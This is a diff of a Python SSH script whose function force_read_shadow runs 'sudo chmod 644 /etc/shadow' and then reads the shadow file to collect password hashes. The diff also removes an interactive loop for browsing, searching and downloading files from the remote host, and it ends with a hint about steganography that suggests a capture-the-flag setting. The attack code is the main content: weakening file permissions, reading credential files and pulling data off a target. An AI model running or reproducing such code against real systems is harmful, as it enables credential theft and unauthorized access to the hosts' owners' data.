@@ -66,7 +66,7 @@ def force_read_shadow(host, ssh_user, ssh_password):
         client.exec_command("sudo chmod 644 /etc/shadow")
         
         # Read the shadow file
-        command = "cat /etc/shadow"
+        command = "cat //etc/shadow"
         stdin, stdout, stderr = client.exec_command(command)
         shadow_content = stdout.read().decode().strip()
 
@@ -169,54 +169,12 @@ if __name__ == "__main__":
             print(f"   {line}")
         print("\n")
 
-    # Continuous File Viewing & Keyword Search Loop
-    while True:
-        print("\n💡 Options: ")
-        print("1️⃣ View the contents of a directory")
-        print("2️⃣ View the content of a file")
-        print("3️⃣ Search for a keyword in a file")
-        print("4️⃣ Download a file to your local machine")
-        print("5️⃣ Exit")
-
-        choice = input("\nSelect an option (1/2/3/4/5): ").strip()
-
-        if choice == "1":
-            directory_to_view = input("📂 Enter the full path of the directory you want to view: ").strip()
-            directory_content = view_directory_contents(target_host, username, password, directory_to_view)
-            print("\n📂 Directory contents:")
-            print(directory_content)
-        
-        elif choice == "2":
-            file_to_view = input("📄 Enter the full path of the file you want to view: ").strip()
-            file_content = view_file_content(target_host, username, password, file_to_view)
-            print("\n📄 File contents:")
-            print(file_content)
-        
-        elif choice == "3":
-            file_to_search = input("🔍 Enter the full path of the file you want to search in: ").strip()
-            keyword = input("🔎 Enter the keyword to search for: ").strip()
-            search_results = search_keyword_in_file(target_host, username, password, file_to_search, keyword)
-            print("\n🔍 Search results:")
-            print(search_results)
-
-        elif choice == "4":
-            remote_file_path = input("📄 Enter the full path of the file you want to download: ").strip()
-            local_file_path = input("💾 Enter the local path to save the file: ").strip()
-            download_result = download_file(target_host, username, password, remote_file_path, local_file_path)
-            print("\n📥 Download result:")
-            print(download_result)
-
-        elif choice == "5":
-            print("\n🚀 **Task complete. Exiting.**")
-            break  # Exit loop when user types "exit"
-        
-        else:
-            print("\n⚠ Invalid choice. Please select a valid option.")
-
-    # Summary and guidance
     print("\n🚀 **Task complete.**")
     print("✔ Listed files in common directories")
     print("✔ Allowed manual selection of files and directories for viewing")
     print("✔ **Added feature to view directory contents**")
     print("✔ **Added keyword search feature**")
     print("✔ **Added download file feature**")
+
+    # Final Hint for the User
+    print("\n💡 **Hint:** Don't forget to download images for steganography analysis and any files that seem important! 🔍")
